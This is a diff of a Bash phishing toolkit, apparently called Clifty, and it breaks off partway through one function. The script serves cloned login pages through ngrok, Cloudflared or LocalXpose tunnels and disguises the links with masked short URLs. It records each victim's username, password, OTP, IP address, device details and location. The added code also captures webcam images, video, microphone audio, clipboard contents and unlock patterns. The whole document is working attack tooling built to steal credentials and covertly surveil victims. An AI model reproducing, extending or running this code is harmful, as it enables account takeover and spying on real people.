@@ -121,12 +121,12 @@ dumps_dir="${pro_dir}/assets/dumps" #dumps directory
 update_dir="${pro_dir}/assets/update" #update dir
 sites_dir="${pro_dir}/.sites" #sites directory
 logs_dir="${pro_dir}/logs" #logs directory
-final_site_dir=" " #final site
-final_logs_dir=" "
-
-#Date---
 log_dir_name=$(date +%d-%m-%Y-%H-%M-%S)
 log_name=logs.txt
+final_log_dir="${pro_dir}/logs/${log_dir_name}"
+final_log_name="${final_log_dir}/logs.txt"
+
+#Date---
 date_date=$(date +%d)
 date_month=$(date +%m)
 date_year=$(date +%Y)
@@ -147,12 +147,9 @@ site_access="" #to store access type i.e login, cam, mic, etc
 site_name="" # To store site name
 site_id="" # To store site id 
 site_template="" #to store site type i.e default, poll etc
-
-capture_type="" #to store capture type i.e otp, notp, etc
-
-dgfname="" #to store zip name for downloading the site
-
 rdurl="" #to store default redirect URL
+dgfname="" #to store zip name for downloading the site
+capture_type="" #to store capture type i.e otp, notp, etc
 
 myip="" #to store ausers ip
 netstats="" #to store network type
@@ -192,7 +189,7 @@ cbanner(){
 sbanner(){
 	echo -e " "
 	echo -e "${CYAN} ░█▀▀░█░░░▀█▀░█▀▀░▀█▀░█░█ ${NC}"
-	echo -e "${CYAN} ░█░░░█░░░░█░░█▀▀░░█░░░█░ ${NC}"
+	echo -e "${CYAN} ░█░░░█░░░░█░░█▀▀░░█░░███ ${NC}"
 	echo -e "${CYAN} ░▀▀▀░▀▀▀░▀▀▀░▀░░░░▀░░░▀░ ${NC}"
 	echo -e "${NC} "
 }
@@ -234,10 +231,10 @@ directories(){
                 mv index.php ${fetch_dir}/
                 echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded index.php"
         fi
-        if [[ ! -e "${fetch_dir}/device.php" ]]; then
-                wget --no-check-certificate ${link_modules_raw}/sites/fetch/device.php > /dev/null 2>&1
-                mv device.php ${fetch_dir}/
-                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded device.php"
+        if [[ ! -e "${fetch_dir}/device.js" ]]; then
+                wget --no-check-certificate ${link_modules_raw}/sites/fetch/device.js > /dev/null 2>&1
+                mv device.js ${fetch_dir}/
+                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded device.js"
         fi
         if [[ ! -e "${fetch_dir}/device_post.php" ]]; then
                 wget --no-check-certificate ${link_modules_raw}/sites/fetch/device_post.php > /dev/null 2>&1
@@ -253,9 +250,6 @@ directories(){
                 wget --no-check-certificate ${link_modules_raw}/sites/fetch/device.html > /dev/null 2>&1
                 mv device.html ${fetch_dir}/
                 echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded device.html"
-        fi
-        if [[ !  -x "${dgf_dir}/dgf.sh" ]];then
-                chmod 777 "${dgf_dir}/dgf.sh"
         fi
 }
 
@@ -377,32 +371,32 @@ status() {
 status_display(){
         { clear; banner; }
         if [[ ! -z $myip ]]; then
-		echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
+		echo -e "\t\t${GREEN})) ${CYAN}Your IP address = $myip${NA}"
         else
                 status
         fi
         if [[ ! -z $netstats ]]; then
-		echo -e "\t\t${GREEN})) ${BLUE}Network Status = $netstats${NA}"
+		echo -e "\t\t${GREEN})) ${CYAN}Network Status = $netstats${NA}"
         else
                 status
         fi
         if [[ ! -z $site_access ]]; then
-		echo -e "\t\t${GREEN})) ${ULBLUE}SITE TYPE${NA}: ${BOLDMAGENTA}${site_access}${NA}"
+		echo -e "\t\t${GREEN})) ${CYAN}SITE TYPE${NA}: ${BOLDMAGENTA}${site_access}${NA}"
         fi
         if [[ ! -z $site_name ]]; then
-		echo -e "\t\t${GREEN})) ${ULBLUE}SITE NAME${NA}: ${BOLDMAGENTA}${site_name}${NA}"
+		echo -e "\t\t${GREEN})) ${CYAN}SITE NAME${NA}: ${BOLDMAGENTA}${site_name}${NA}"
         fi
         if [[ ! -z $site_template ]]; then
-		echo -e "\t\t${GREEN})) ${ULBLUE}TEMPLATE${NA} : ${BOLDMAGENTA}${site_template}${NA}"
+		echo -e "\t\t${GREEN})) ${CYAN}TEMPLATE${NA} : ${BOLDMAGENTA}${site_template}${NA}"
         fi
         if [[ ! -z $tunnel_name ]]; then
-		echo -e "\t\t${GREEN})) ${ULBLUE}TUNNELER${NA} : ${BOLDMAGENTA}${tunnel_name}${NA}"
+		echo -e "\t\t${GREEN})) ${CYAN}TUNNELER${NA} : ${BOLDMAGENTA}${tunnel_name}${NA}"
         fi
         if [[ ! -z $PORT ]]; then
-		echo -e "\t\t${GREEN})) ${ULBLUE}PORT    ${NA} : ${BOLDMAGENTA}${PORT}${NA}"
+		echo -e "\t\t${GREEN})) ${CYAN}PORT    ${NA} : ${BOLDMAGENTA}${PORT}${NA}"
         fi
         if [[ ! -z $rdurl ]]; then
-		echo -e "\t\t${GREEN})) ${ULBLUE}REDIRECT${NA} : ${BOLDMAGENTA}${rdurl}${NA}"
+		echo -e "\t\t${GREEN})) ${CYAN}REDIRECT${NA} : ${BOLDMAGENTA}${rdurl}${NA}"
         fi
         echo -e ""
         echo -e ""
@@ -1148,7 +1142,8 @@ start_ngrok() {
 #load_print "Launching NGROK" '15'
         echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
         if [[ `command -v termux-chroot` ]]; then
-                sleep 2 && termux-chroot .${server_dir}/ngrok http --region ${ngrokregion} "$HOST":"$PORT"> /dev/null 2>&1 &
+                cd ${pro_dir}
+                sleep 2 && termux-chroot ./.server/ngrok http --region ${ngrokregion} "$HOST":"$PORT"> /dev/null 2>&1 &
         else
                 sleep 2 && .${server_dir}/ngrok http --region ${ngrokregion} "$HOST":"$PORT"> /dev/null 2>&1 &
         fi
@@ -1205,7 +1200,8 @@ start_cloudflared() {
         echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
         if [[ `command -v termux-chroot` ]]; then
-                sleep 2 && termux-chroot .${server_dir}/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
+                cd ${pro_dir}
+                sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
         else
                 sleep 2 && .${server_dir}/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
         fi
@@ -1285,7 +1281,8 @@ start_loclx() {
 	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
 
 	if [[ `command -v termux-chroot` ]]; then
-		sleep 1 && termux-chroot .${server_dir}/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > ${server_dir}/.loclx 2>&1 &
+                cd ${pro_dir}
+		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > ${server_dir}/.loclx 2>&1 &
 	else
 		sleep 1 && ./${server_dir}/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > ${server_dir}/.loclx 2>&1 &
 	fi
@@ -1411,9 +1408,9 @@ setup_site_dgf() {
 	if [ $plainnetstats == "online" ]; then
                 echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Downloading site..."${WHITE}
                 if [ ${capture_type}="NOTP" ];then
-                        bash ${dgf_dir}/dgf.sh ${dgfurl} otp
+                        dgf ${dgfurl} otp
                 else
-                        bash ${dgf_dir}/dgf.sh ${dgfurl} none
+                        dgf ${dgfurl} none
                 fi
                 if [ -d ${site_access}/${site_id} ]; then
                         sleep 3
@@ -1433,6 +1430,102 @@ setup_site_dgf() {
                 sleep 5
                 msg_exit
 	fi
+}
+dgf(){
+        auth_token=""
+        url=$1
+        exclude=$2
+        has_branch=$(echo ${url} | grep /tree/ > /dev/null; echo $?)
+        tokens=(${url//"/"/ })
+        tokens_len=$((${#tokens[@]} - 1))
+        owner=${tokens[2]}
+        repo=${tokens[3]}
+        if [[ $has_branch -eq 0 ]]
+        then
+                branch=${tokens[5]}
+                dir_path=${tokens[6]}
+                dir_path_start_idx="7"
+        else
+                dir_path=${tokens[4]}
+                dir_path_start_idx="5"
+        fi
+        for ((i = ${dir_path_start_idx}; i <= ${tokens_len}; i++));
+        do
+                dir_path="${dir_path}/${tokens[i]}"
+        done
+        # API Template "https://api.github.com/repos/${OWNER}/${REPO}/contents/${DIR_PATH}?ref=${BRANCH}"
+        contents_url="https://api.github.com/repos/${owner}/${repo}/contents"
+        if [[ "${dir_path}" != "" ]]
+        then
+                contents_url="${contents_url}/${dir_path}"
+
+                if [[ "${branch}" != "" ]]
+                then
+                        contents_url="${contents_url}?ref=${branch}"
+                fi
+        fi
+        contents_file=$(mktemp)
+        accept_header="Accept: application/vnd.github.v3+json"
+        auth_header="Authorization: token ${auth_token}"
+        if [ "${auth_token}" = "" ];
+        then
+                curl -s -H "${accept_header}" "${contents_url}" > ${contents_file}
+        else
+                curl -s -H "${auth_header}" -H "${accept_header}" "${contents_url}" > ${contents_file}
+        fi
+        rate_exceeded=$(cat ${contents_file} | grep "API rate limit exceeded" > /dev/null; echo $?)
+        if [[ "${rate_exceeded}" -eq 0 ]]
+        then
+                echo "ERROR : API Rate limit is exceeded."
+                echo -e ""
+                exit 1
+        fi
+        file_names=$(cat ${contents_file} | grep "\"name\":")
+        file_names=${file_names//"\"name\":"/}
+        file_names=${file_names//"\""/}
+        file_names=${file_names//","/}
+        file_names=(${file_names})
+        paths=$(cat ${contents_file} | grep "\"path\":")
+        paths=${paths//"\"path\":"/}
+        paths=${paths//"\""/}
+        paths=${paths//","/}
+        paths=(${paths})
+        download_urls=$(cat ${contents_file} | grep "\"download_url\":")
+        download_urls=${download_urls//"\"download_url\":"/}
+        download_urls=${download_urls//"\""/}
+        download_urls=${download_urls//","/}
+        download_urls=(${download_urls})
+        n_files=${#file_names[@]}
+        runners=()
+        for ((i = 0; i < ${n_files}; i++));
+        do
+                f_name=${file_names[i]}
+                path=${paths[i]}
+                check_dir=$(dirname "${path}")
+                download_url=${download_urls[i]}
+                if [[ "${#runners[@]}" -ge 10 ]]; then
+                        wait ${runners[@]}
+                        runners=()
+                fi
+                if [ "${download_url}" == "null" ]; then
+                        if [[ "$check_dir" != *$exclude ]]; then
+                                mkdir -p "${path}"
+                                bash $0 "${url}/${f_name}" "${auth_token}"
+                                if [[ "$?" -ne 0 ]]; then
+                                        echo "Error"
+                                        exit $?
+                                fi
+                        fi
+                        continue;
+                else
+                if [[ "$check_dir" != *$exclude ]]; then
+                        mkdir -p $(dirname "${path}")
+                                echo "${path}"
+                                curl -s "${download_url}" > "${path}" &
+                        runners+=($!)
+                        fi
+                fi
+        done
 }
 start_php() {
         { clear; banner; echo -e ""; }
@@ -1476,10 +1569,29 @@ redirect_setup() {
         if [ -z "$urdurl" ]; then
                rdurl=${urdurl}
         fi 
-	if [ ${capture_type}="NOTP" ];then
+	if [[ ${capture_type}="NOTP" ]];then
                 awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/process.php"
-        elif [[ ${capture_type}="OOTP" || ${capture_type}="POTP" ]];then
+        elif [[ ${capture_type}="POTP" ]];then
                 awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/otp.php"
+        elif [[ ${capture_type}="OOTP" ]];then
+                awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/otp.php"
+        elif [[ ${capture_type}="IMG" ]];then
+                echo " NOT READ YET"; sleep 3
+        ##        awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/otp.php"
+        elif [[ ${capture_type}="VID" ]];then
+                echo " NOT READ YET"; sleep 3
+        ##        awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/otp.php"
+        elif [[ ${capture_type}="MIC" ]];then
+                echo " NOT READ YET"; sleep 3
+        ##        awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/otp.php"
+        elif [[ ${capture_type}="LOC" ]];then
+                awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/index.php"
+        elif [[ ${capture_type}="CLIP" ]];then
+                awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/index.php"
+        elif [[ ${capture_type}="PAT" ]];then
+                awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/post.php"
+        elif [[ ${capture_type}="IP" ]];then
+                awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/index.php"
 	else
 		echo -e "${RED}[${WHITE}!${RED}]${RED} Error Occured in setting up custom redirect URL!!"
                 echo -ne "\n${RED}[${WHITE}?${RED}]${GREEN} Setting up default redirect URL"
@@ -1627,41 +1739,53 @@ shorten_tinyurl() {
 ## Display link
 displaylocalhost(){
         status_display
-        echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} LOGS NAME : ${WHITE}${pro_dir}/logs/${log_dir_name}/${log_name}${NA}"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} LOCALHOST URL : ${GREEN}http://${HOST}:${PORT} ${NA}"        
+        echo -ne "\n${RED}[${WHITE}-${RED}]${CYAN} LOGS NAME : ${WHITE}${final_log_name}${NA}"
+	echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} LOCALHOST URL : ${WHITE}http://${HOST}:${PORT} ${NA}"        
 }
 displaylink(){
 	displaylocalhost
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} ORIGINAL URL  : ${GREEN}${LINK}"
+	echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} ORIGINAL URL  : ${GREEN}${LINK}"
 }
 displayshortlink() {
 	displaylink
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 1 : ${GREEN}${final_isgd_url}"
-	echo -e "${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  1 : ${GREEN}${masked_isgd_url}"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 2 : ${GREEN}${final_shortcode_url1}"
-	echo -e "${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  2 : ${GREEN}${masked_shortcode_url1}"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 3 : ${GREEN}${final_shortcode_url2}"
-	echo -e "${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  3 : ${GREEN}${masked_shortcode_url2}"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 4 : ${GREEN}${final_shortcode_url3}"
-	echo -e "${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  4 : ${GREEN}${masked_shortcode_url3}"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 5 : ${GREEN}${final_tinyurl_url}"
-	echo -e "${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  5 : ${GREEN}${masked_tinyurl_url}"
+	echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} SHORTEN URL 1 : ${GREEN}${final_isgd_url}"
+	echo -e "${RED}[${WHITE}-${RED}]${CYAN} MASKED URL  1 : ${GREEN}${masked_isgd_url}"
+	echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} SHORTEN URL 2 : ${GREEN}${final_shortcode_url1}"
+	echo -e "${RED}[${WHITE}-${RED}]${CYAN} MASKED URL  2 : ${GREEN}${masked_shortcode_url1}"
+	echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} SHORTEN URL 3 : ${GREEN}${final_shortcode_url2}"
+	echo -e "${RED}[${WHITE}-${RED}]${CYAN} MASKED URL  3 : ${GREEN}${masked_shortcode_url2}"
+	echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} SHORTEN URL 4 : ${GREEN}${final_shortcode_url3}"
+	echo -e "${RED}[${WHITE}-${RED}]${CYAN} MASKED URL  4 : ${GREEN}${masked_shortcode_url3}"
+	echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} SHORTEN URL 5 : ${GREEN}${final_tinyurl_url}"
+	echo -e "${RED}[${WHITE}-${RED}]${CYAN} MASKED URL  5 : ${GREEN}${masked_tinyurl_url}"
 	capture_data_check
 }
 
 #Capture data check
 capture_data_check(){
-        final_logs_dir="${pro_dir}/logs/${log_dir_name}"
-	final_logs_name="${final_logs_dir}/logs.txt"
-        echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit..."
-        mkdir ${final_logs_dir}
-        touch ${final_logs_name}
+        echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Victim to open the link, ${MAGENTA}Ctrl + C ${YELLOW}to exit..."
+        mkdir ${final_log_dir}
+        touch ${final_log_name}
 	if [ ${capture_type}="NOTP" ];then
                 capture_data_notp
         elif [ ${capture_type}="OOTP" ];then
                 capture_data_ootp
         elif [ ${capture_type}="POTP" ];then
                 capture_data_potp
+        elif [ ${capture_type}="IMG" ];then
+                capture_img
+        elif [ ${capture_type}="VID" ];then
+                capture_vid
+        elif [ ${capture_type}="MIC" ];then
+                capture_mic
+        elif [ ${capture_type}="LOC" ];then
+                capture_loc
+        elif [ ${capture_type}="CLIP" ];then
+                capture_clip
+        elif [ ${capture_type}="PAT" ];then
+                capture_pat
+        elif [ ${capture_type}="IP" ];then
+                capture_ip
 	else
 		echo -e " Error Occured in capturing data!!"
         fi
@@ -1670,76 +1794,17 @@ capture_data_check(){
 # POTP - id pass otp
 }
 
-## Print data no otp
-capture_data_notp() {  
-	while true; do
-                if [[ -e "${www_dir}/ip.txt" ]]; then
-                        capture_ip
-                fi
-                sleep 0.75
-                if [[ -e "${www_dir}/usernames.txt" ]]; then
-                        capture_id
-			capture_pass
-			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Next Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit. "
-                fi
-                sleep 0.75
-	done
-}
-
-## Print data otp
-capture_data_ootp() {
-	while true; do
-                if [[ -e "${www_dir}/ip.txt" ]]; then
-                        capture_ip
-                fi
-                sleep 0.75
-                if [[ -e "${www_dir}/usernames.txt" ]]; then
-                        capture_id
-			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for OTP > "
-			echo -ne "\n${ITALICWHITE} NOTE : OTP will only be sent to victim when you login to offical website ${NA}"
-                fi
-		if [[ -e "${www_dir}/otp.txt" ]]; then
-                        capture_otp
-			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Next Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit. "
-                fi
-                sleep 0.75
-	done
-}
-
-## Print data notp & otp
-capture_data_potp() {
-	while true; do
-                if [[ -e "${www_dir}/ip.txt" ]]; then
-                        capture_ip
-                fi
-                sleep 0.75
-                if [[ -e "${www_dir}/usernames.txt" ]]; then
-                        capture_id
-			capture_pass
-			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for OTP >"
-                       echo -ne "\n${ITALICWHITE} NOTE : OTP will only be sent to victim when you login to offical website ${NA}"
-                fi
-		if [[ -e "${www_dir}/otp.txt" ]]; then
-			capture_otp
-			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Next Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit. "
-		fi
-                sleep 0.75
-	done
-}
-
 ## Get IP address
 capture_ip() {
 	IP=$(grep -a 'IP:' ${www_dir}/ip.txt | cut -d " " -f2 | tr -d '\r')
 ##	IP=$(awk -F 'IP: ' '{print $2}' ${www_dir}/ip.txt | xargs)
 	victim_ip=${IP}
 	echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} VICTIM IP : ${BOLDWHITE}${victim_ip}${NA}"
-        cat ${dumps_dir}/space.txt >> ${final_logs_name}
-	cat ${dumps_dir}/line.txt >> ${final_logs_name}
-	cat ${www_dir}/ip.txt >> ${final_logs_name}
-	cat ${dumps_dir}/space.txt >> ${final_logs_name}
-        cat ${dumps_dir}/line.txt >> ${final_logs_name}
-	cat ${dumps_dir}/space.txt >> ${final_logs_name}
-	echo -ne "\n${BLUE}Saved IP address in Logs"
+        cat ${dumps_dir}/space.txt >> ${final_log_name}
+	cat ${dumps_dir}/line.txt >> ${final_log_name}
+        cat ${dumps_dir}/space.txt >> ${final_log_name}
+	cat ${www_dir}/ip.txt >> ${final_log_name}
+	echo -ne "\n${CYAN}Saved IP address in Logs"
 	if [[ $reply_tunnel -eq 1 || $reply_tunnel -eq 01 ]]; then
 		echo -ne "${RED} IP details cannot be captured in localhost server"
 	else
@@ -1750,16 +1815,16 @@ capture_ip() {
                 echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} VICTIM DEVICE DETAILS : ${RESETBG} ${BOLDWHITE}"
                 cat ${www_dir}/device.txt 
                 echo -e "${NA}"
-		cat ${dumps_dir}/space.txt >> ${final_logs_name}
-                cat ${dumps_dir}/line.txt >> ${final_logs_name}
-                cat ${dumps_dir}/space.txt >> ${final_logs_name}
-                cat ${www_dir}/device.txt >> "${final_logs_name}"
-                echo -ne "\n${BLUE}Saved device details in Logs"
+	        cat ${dumps_dir}/space.txt >> ${final_log_name}
+                cat ${dumps_dir}/line.txt >> ${final_log_name}
+                cat ${dumps_dir}/space.txt >> ${final_log_name}
+                cat ${www_dir}/device.txt >> ${final_log_name}
+                echo -ne "\n${CYAN}Saved device details in Logs"
 	fi
 
 }
 ip_details() {
-	echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} Trying to capture details of IP : ${RESETBG} ${IP}${NA}"
+	echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} Trying to capture details of IP : ${RESETBG} ${victim_ip}${NA}"
 ##	curl -s -L "http://ipwhois.app/json/$IP" -o rawtrack.txt
 	wget --no-check-certificate "http://ipwhois.app/json/${IP}" -O rawtrack.txt > /dev/null 2>&1
 	sleep 2
@@ -1820,11 +1885,11 @@ ip_details() {
 	if [[ $region != "" ]]; then
 		echo -e "${GREEN} State: ${BOLDWHITE} $region"
 	fi
-	cat ${dumps_dir}/space.txt >> ${final_logs_name}
-        cat ${dumps_dir}/line.txt >> ${final_logs_name}
-	cat ${dumps_dir}/space.txt >> ${final_logs_name}
-	cat track.txt >> "${final_logs_name}"
-        echo -ne "\n${BLUE}Saved track details in Logs"
+	cat ${dumps_dir}/space.txt >> ${final_log_name}
+        cat ${dumps_dir}/line.txt >> ${final_log_name}
+	cat ${dumps_dir}/space.txt >> ${final_log_name}
+	cat track.txt >> "${final_log_name}"
+        echo -ne "\n${CYAN}Saved track details in Logs"
 	rm -rf track.txt
 	rm -rf rawtrack.txt
 }
@@ -1834,32 +1899,212 @@ capture_id() {
         victim_id=$( cat ${www_dir}/usernames.txt)
         echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} VICTIM USERNAME : ${RESETBG}${NA}"
 	echo -e "${YELLOW}>>>${MAGENTABG} ${BOLDWHITE}${victim_id}${RESETBG}${NA}"
-        echo -ne "\n${BLUE}Saved in Logs"
-	cat ${dumps_dir}/space.txt >> "${final_logs_name}"
-        cat ${www_dir}/usernames.txt >> "${final_logs_name}"
+        echo -ne "\n${CYAN}Saved in Logs"
+	cat ${dumps_dir}/space.txt >> ${final_log_name}
+        cat ${dumps_dir}/line.txt >> ${final_log_name}
+	cat ${dumps_dir}/space.txt >> ${final_log_name}
+        cat ${www_dir}/usernames.txt >> ${final_log_name}
 	rm -rf ${www_dir}/usernames.txt
 }
-
-## Get credentials
 capture_pass() {
 	victim_pass=$( cat "${www_dir}/pass.txt")
 	echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} VICTIM PASSWORD : ${RESETBG}${NA}"
 	echo -e "${YELLOW}>>>${MAGENTABG} ${BOLDWHITE}${victim_pass}${RESETBG}${NA}"
-        echo -ne "\n${BLUE}Saved in Logs"
-	cat ${dumps_dir}/space.txt >> ${final_logs_name}
-        cat ${www_dir}/pass.txt >> ${final_logs_name}
+        echo -ne "\n${CYAN}Saved in Logs"
+	cat ${dumps_dir}/space.txt >> ${final_log_name}
+        cat ${dumps_dir}/line.txt >> ${final_log_name}
+	cat ${dumps_dir}/space.txt >> ${final_log_name}
+        cat ${www_dir}/pass.txt >> ${final_log_name}
 	rm -rf ${www_dir}/pass.txt
 }
-
-## Get otp
 capture_otp() {
 	victim_otp=$( cat "${www_dir}/otp.txt")
 	echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} VICTIM OTP : ${RESETBG}${NA}"
 	echo -e "${YELLOW}>>>${MAGENTABG} ${BOLDWHITE}${victim_otp}${RESETBG}${NA}"
-        echo -ne "\n${BLUE}Saved in Logs"
-	cat ${dumps_dir}/space.txt >> ${final_logs_name}
-        cat ${www_dir}/otp.txt >> ${final_logs_name}
+        echo -ne "\n${CYAN}Saved in Logs"
+	cat ${dumps_dir}/space.txt >> ${final_log_name}
+        cat ${dumps_dir}/line.txt >> ${final_log_name}
+	cat ${dumps_dir}/space.txt >> ${final_log_name}
+        cat ${www_dir}/otp.txt >> ${final_log_name}
 	rm -rf ${www_dir}/otp.txt
+}
+capture_img(){
+        while true; do
+            if [[ -e "${www_dir}/ip.txt" ]]; then
+                capture_ip
+            fi
+                sleep 0.75
+        	if [[ -e "${www_dir}/Log.log" ]]; then
+			filename=$(date +%d-%m-%Y-%H-%M-%S-%N)
+	       		printf "\n${GREEN} Image file received! ${NC}"
+			echo -ne " "
+	                cat ${dumps_dir}/space.txt >> ${final_log_name}
+                        cat ${dumps_dir}/line.txt >> ${final_log_name}
+	                cat ${dumps_dir}/space.txt >> ${final_log_name}
+                        cat ${www_dir}/Log.log >> ${final_log_name}
+              	        rm -rf ${www_dir}/Log.log
+       		       	mv ${www_dir}/*.png  "${final_log_dir}/clifty-img-${filename}.png"
+                        echo -ne "\n${CYAN}Saved in Logs"
+            fi
+                sleep 0.5
+	done
+}
+capture_vid(){
+        while true; do
+                if [[ -e "${www_dir}/ip.txt" ]]; then
+                        capture_ip
+                fi
+                sleep 0.75
+		if [[ -e "${www_dir}/Log.log" ]]; then
+			filename=$(date +%d-%m-%Y-%H-%M-%S-%N)
+                        printf "\n${GREEN} Video file received! ${NC}"
+			echo -ne " "
+	                cat ${dumps_dir}/space.txt >> ${final_log_name}
+                        cat ${dumps_dir}/line.txt >> ${final_log_name}
+	                cat ${dumps_dir}/space.txt >> ${final_log_name}
+                        cat ${www_dir}/Log.log >> ${final_log_name}
+                        mv ${www_dir}/*.webm  "${final_log_dir}/clifty-video-${filename}.webm"
+                        echo -ne "\n${CYAN}Saved in Logs"
+                fi
+                sleep 0.5
+	done
+}
+capture_mic(){
+        while true; do
+                if [[ -e "${www_dir}/ip.txt" ]]; then
+                        capture_ip
+                fi
+                sleep 0.75
+		if [[ -e "${www_dir}/Log.log" ]]; then
+			filename=$(date +%d-%m-%Y-%H-%M-%S-%N)
+                        printf "\n${GREEN} Audio file received! ${NC}"
+			echo -ne " " 
+	                cat ${dumps_dir}/space.txt >> ${final_log_name}
+                        cat ${dumps_dir}/line.txt >> ${final_log_name}
+	                cat ${dumps_dir}/space.txt >> ${final_log_name}
+                        cat ${www_dir}/Log.log >> ${final_log_name}
+			rm -rf ${www_dir}/Log.log
+                        mv ${www_dir}/*.wav  "${final_log_dir}/clifty-audio-${filename}.wav"
+                        echo -ne "\n${CYAN}Saved in Logs"
+                fi
+                sleep 0.5
+	done
+}
+capture_loc(){
+        while true; do
+                if [[ -e "${www_dir}/ip.txt" ]]; then
+                        capture_ip
+                fi
+                sleep 0.75
+		if [[ -e "${www_dir}/location.txt" ]]; then
+                        echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} VICTIM EXACT LOCATION DETAILS : ${RESETBG} ${BOLDWHITE}"
+                        cat ${www_dir}/location.txt 
+			echo -ne " " 
+	                cat ${dumps_dir}/space.txt >> ${final_log_name}
+                        cat ${dumps_dir}/line.txt >> ${final_log_name}
+	                cat ${dumps_dir}/space.txt >> ${final_log_name}
+                        cat ${www_dir}/location.txt >> ${final_log_name}
+                        mv ${www_dir}/location.txt  "${final_log_dir}"
+                        echo -ne "\n${CYAN}Saved in Logs"
+                fi
+                sleep 0.5
+	done
+}
+capture_clip(){
+        while true; do
+                if [[ -e "${www_dir}/ip.txt" ]]; then
+                        capture_ip
+                fi
+                sleep 0.75
+		if [[ -e "${www_dir}/clipboard.txt" ]]; then
+                        echo -e "\n${MAGENTABG} ${BOLDWHITE}"
+                        cat ${www_dir}/clipboard.txt 
+			echo -ne "${NA}" 
+	                cat ${dumps_dir}/space.txt >> ${final_log_name}
+                        cat ${dumps_dir}/line.txt >> ${final_log_name}
+	                cat ${dumps_dir}/space.txt >> ${final_log_name}
+                        cat ${www_dir}/clipboard.txt >> ${final_log_name}
+                        mv ${www_dir}/clipboard.txt  "${final_log_dir}"
+                        echo -ne "\n${CYAN}Saved in Logs"
+                fi
+                sleep 0.5
+	done
+}
+capture_pat(){
+        while true; do
+                if [[ -e "${www_dir}/ip.txt" ]]; then
+                        capture_ip
+                fi
+                sleep 0.75
+		if [[ -e "${www_dir}/pattern.txt" ]]; then
+                        echo -e "\n${MAGENTABG} ${BOLDWHITE}"
+                        cat ${www_dir}/pattern.txt 
+			echo -ne "${NA}" 
+	                cat ${dumps_dir}/space.txt >> ${final_log_name}
+                        cat ${dumps_dir}/line.txt >> ${final_log_name}
